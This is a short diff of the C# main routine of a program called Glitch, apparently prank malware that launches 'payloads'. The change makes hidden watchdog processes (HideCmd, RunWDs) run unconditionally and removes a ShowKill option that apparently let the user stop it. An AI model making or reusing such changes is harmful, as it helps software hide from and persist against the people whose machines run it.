@@ -1,6 +1,4 @@
-﻿#define Watch_Dogs
-
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Reflection;
@@ -16,13 +14,11 @@ namespace Glitch
 
         public static void Main(string[] args)
         {
-#if Watch_Dogs
             if (args.Length == 1 && args[0] == "wd")
             {
                 WatchDog.Run();
                 return;
             }
-#endif
             args = args == null || args.Length == 0
                 ? new[] {"form"}
                 : args.Select(s => s.ToLower().TrimStart('-', '/', '\\')).ToArray();
@@ -52,12 +48,8 @@ namespace Glitch
                     StandardCommands.ShowNotepad();
                     payloads.ForEach(s => LaunchRunner(s.Item1, s.Item2));
                     StandardCommands.LaunchIncrementor();
-#if Watch_Dogs
                     StandardCommands.HideCmd();
                     StandardCommands.RunWDs();
-#else
-                    ShowKill();
-#endif
                     break;
                 case "run":
                     if (args.Contains("np"))
@@ -128,5 +120,3 @@ namespace Glitch
             StandardCommands.GetRunner(method, data.RunAfter, data.DefaultDelay).Start();
     }
 }
-
-//TODO: Test BSOD
